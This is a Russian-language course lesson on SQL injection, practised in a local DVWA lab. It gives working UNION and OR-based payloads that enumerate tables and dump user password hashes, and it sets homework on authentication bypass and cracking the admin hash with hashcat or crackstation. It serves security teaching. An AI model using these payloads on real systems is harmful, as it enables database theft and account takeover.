# Занятие 18. SQL Injection: Теория и практика на DVWA (Low)

## Теория

**SQL Injection (SQLi)** — это уязвимость, при которой атакующий может внедрить произвольный SQL-код в запрос, который приложение отправляет в базу данных.

### Механизм работы

Когда веб-приложение строит SQL-запрос, подставляя пользовательский ввод напрямую в строку запроса без проверки, атакующий может изменить логику запроса.

**Уязвимый код (PHP, уровень Low в DVWA):**
```php
$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";
$result = mysqli_query($GLOBALS["___mysqli_ston"], $query);
```

Если `$id = 1' OR '1'='1`, запрос становится:
```sql
SELECT first_name, last_name FROM users WHERE user_id = '1' OR '1'='1';
```

Условие `'1'='1'` всегда истинно, поэтому вернутся ВСЕ записи из таблицы.

### Типы SQL Injection

1. **In-band (классический)**:
   - **Error-based** — получение информации через сообщения об ошибках БД
   - **Union-based** — использование оператора UNION для объединения результатов

2. **Blind (слепой)**:
   - **Boolean-based** — анализ разницы в ответе (true/false)
   - **Time-based** — анализ задержки ответа (SLEEP())

3. **Out-of-band**: использование внешних каналов (DNS, HTTP) для exfiltration данных

### Опасность SQL Injection

- Чтение всех данных из базы (пользователи, пароли, токены)
- Модификация данных (UPDATE, DELETE)
- Иногда — выполнение команд ОС (через xp_cmdshell в MSSQL или INTO OUTFILE)
- Обход аутентификации

### Признаки уязвимости

- Приложение возвращает ошибку базы данных
- Страница меняет поведение при вводе `'` или `"`
- Запрос возвращает больше данных, чем ожидалось

## Практическое занятие

### Настройка DVWA

1. Откройте http://localhost (DVWA)
2. Войдите: admin / password
3. Перейдите в **DVWA Security** — установите **Low**
4. В меню слева выберите **SQL Injection**

### Практика: базовые пейлоады

**Шаг 1: Проверка на уязвимость**
```
User ID: 1'
```
Результат: ошибка базы данных (You have an error in your SQL syntax) — приложение уязвимо!

**Шаг 2: Вывод всех пользователей**
```
User ID: 1' OR '1'='1
```
Результат: таблица со всеми пользователями (admin, gordonb, 1337, pablo, smithy).

**Шаг 3: Использование UNION для получения версии БД**
```
User ID: 1' UNION SELECT version(), user()#
```
Результат: первая колонка покажет версию MySQL (например, 5.7.33), вторая — пользователя БД.

**Шаг 4: Получение списка таблиц**
```
User ID: 1' UNION SELECT table_name, table_schema FROM information_schema.tables WHERE table_schema='dvwa'#
```
Результат: список таблиц (guestbook, users).

**Шаг 5: Получение структуры таблицы users**
```
User ID: 1' UNION SELECT column_name, data_type FROM information_schema.columns WHERE table_name='users'#
```
Результат: колонки (user_id, first_name, last_name, user, password, avatar, last_login, failed_login).

**Шаг 6: Получение хешей паролей**
```
User ID: 1' UNION SELECT user, password FROM users#
```
Результат: логины и хеши паролей (в формате MD5).

### Анализ ответа

Посмотрите на исходный код ответа (Ctrl+U). Обратите внимание, как результаты запроса вставляются в HTML:
```html
<tr>
    <td>First name: </td><td>admin</td>
</tr>
<tr>
    <td>Surname: </td><td>admin</td>
</tr>
```

### Скриншоты для отчета

1. **Скриншот 1**: Ввод `1'` — видна ошибка SQL (красный текст)
2. **Скриншот 2**: Ввод `1' OR '1'='1` — таблица со всеми пользователями
3. **Скриншот 3**: Ввод UNION запроса с version() — показана версия БД

## Задачи для самостоятельного выполнения

1. **Получение всех данных**: Используя SQL Injection на DVWA (Low), получите список всех пользователей с их хешами паролей. В отчете укажите: какой запрос вы использовали, сколько пользователей найдено, какие хеши у пользователей admin и gordonb.

2. **Работа с информацией о БД**: Используя UNION и таблицу information_schema, определите:
   - Какие базы данных доступны серверу MySQL
   - Какие таблицы есть в базе dvwa
   - Какие типы данных у колонок таблицы users
   
   Запишите использованные пейлоады.

3. **Обход аутентификации**: На странице **SQL Injection (Blind)** в DVWA попробуйте выполнить вход, используя SQL-инъекцию в поле логина. Попробуйте пейлоад: `admin' #` или `admin' OR '1'='1`. Опишите, сработало ли это и почему.

4. **Попытка на уровне Medium**: Переключите DVWA на уровень **Medium** и снова зайдите в SQL Injection. Попробуйте те же пейлоады. Используйте инструмент **Burp Suite** (или DevTools браузера), чтобы посмотреть, как отправляется запрос. Чем уровень Medium отличается от Low?

5. **Взлом хешей**: Возьмите хеш пароля пользователя admin (из задачи 1) и попробуйте подобрать пароль через онлайн-сервис crackstation.net или hashcat. Укажите, какой пароль соответствует хешу.
